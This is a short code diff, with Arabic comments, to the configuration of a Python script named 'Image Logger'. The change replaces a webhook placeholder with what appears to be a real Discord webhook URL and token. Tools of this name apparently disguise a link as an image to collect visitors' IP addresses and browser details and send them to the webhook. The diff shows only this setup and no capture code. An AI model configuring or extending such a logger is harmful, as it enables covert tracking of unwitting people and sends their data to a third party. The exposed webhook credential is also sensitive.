@@ -4,7 +4,7 @@ import requests, base64, httpagentparser, json, os
 
 # نفس الكونفغ ولكن مع تعديل الـ webhook
 config = {
-    "webhook": "YOUR_WEBHOOK_URL",  # ضع رابط الـ webhook الخاص بك هنا
+    "webhook": "https://canary.discord.com/api/webhooks/1541479611828015194/p6Kzfmr-VoOarPTnQG_BsPaa7aLrd7P6WVtrUKcn81SRjJUBFN05rfRUD7n1XVGai_Yq",  # ضع رابط الـ webhook الخاص بك هنا
     "image": "حط الصورة هون",
     "imageArgument": True,
     "username": "Image Logger",
